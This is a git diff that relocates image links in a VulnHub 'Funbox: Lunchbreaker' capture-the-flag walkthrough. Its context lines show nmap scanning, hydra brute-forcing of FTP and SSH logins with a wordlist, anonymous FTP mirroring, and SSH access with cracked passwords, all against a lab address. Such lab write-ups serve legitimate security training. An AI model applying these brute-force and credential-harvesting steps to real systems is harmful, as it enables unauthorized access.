@@ -3,7 +3,7 @@
 - **Machine:** Funbox: Lunchbreaker
 - **Download:** https://www.vulnhub.com/entry/funbox-lunchbreaker,700/
 
-![](832-1.png)
+![](images/832-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](832-2.png)
+![](images/832-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.240
 ```
 
-![](832-3.png)
+![](images/832-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ This command performs an aggressive scan and runs the `http-enum` NSE script to 
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.240
 ```
 
-![](832-4.png)
+![](images/832-4.png)
 
 ---
 
@@ -76,7 +76,7 @@ Visit the following URLs:
 
 View the page source and look for hidden information.
 
-![](832-5.png)
+![](images/832-5.png)
 
 ### Clue Found
 
@@ -96,7 +96,7 @@ Use Hydra to identify Jane's FTP password.
 hydra -V -l jane -P /opt/rockyou.txt 192.168.2.240 ftp
 ```
 
-![](832-6.png)
+![](images/832-6.png)
 
 ### Credentials
 
@@ -115,7 +115,7 @@ Password : password
 ftp 192.168.2.240
 ```
 
-![](832-7.png)
+![](images/832-7.png)
 
 List all files.
 
@@ -133,7 +133,7 @@ get .s3cr3t
 get supers3cr3t
 ```
 
-![](832-8.png)
+![](images/832-8.png)
 
 ---
 
@@ -147,7 +147,7 @@ cat .s3cr3t
 cat supers3cr3t
 ```
 
-![](832-9.png)
+![](images/832-9.png)
 
 The `supers3cr3t` file appears to contain Brainfuck-encoded data.
 
@@ -157,7 +157,7 @@ Decode the Base64 content.
 cat .s3cr3t | base64 -d
 ```
 
-![](832-10.png)
+![](images/832-10.png)
 
 ---
 
@@ -169,7 +169,7 @@ Mirror the WordPress directory from the FTP server.
 wget -m ftp://anonymous:anonymous@192.168.2.240/wordpress/
 ```
 
-![](832-11.png)
+![](images/832-11.png)
 
 ---
 
@@ -203,7 +203,7 @@ Download the key file.
 get keys.txt
 ```
 
-![](832-12.png)
+![](images/832-12.png)
 
 Read the file.
 
@@ -211,7 +211,7 @@ Read the file.
 cat keys.txt
 ```
 
-![](832-13.png)
+![](images/832-13.png)
 
 ---
 
@@ -229,7 +229,7 @@ List hidden files.
 ls -la
 ```
 
-![](832-14.png)
+![](images/832-14.png)
 
 ---
 
@@ -239,7 +239,7 @@ ls -la
 hydra -V -l jim -P /opt/rockyou.txt 192.168.2.240 ftp
 ```
 
-![](832-15.png)
+![](images/832-15.png)
 
 ### Credentials
 
@@ -258,7 +258,7 @@ Password : 12345
 hydra -l jules -P /opt/rockyou.txt ftp://192.168.2.240
 ```
 
-![](832-16.png)
+![](images/832-16.png)
 
 ### Credentials
 
@@ -303,9 +303,9 @@ get .bad-passwds
 get .good-passwd
 ```
 
-![](832-17.png)
+![](images/832-17.png)
 
-![](832-18.png)
+![](images/832-18.png)
 
 ---
 
@@ -317,7 +317,7 @@ Use the recovered password list to brute-force John's SSH password.
 hydra -l john -P .bad-passwds ssh://192.168.2.240
 ```
 
-![](832-19.png)
+![](images/832-19.png)
 
 ---
 
@@ -334,7 +334,7 @@ Username : john
 Password : zhnmju!!!
 ```
 
-![](832-20.png)
+![](images/832-20.png)
 
 Successful authentication provides shell access.
 
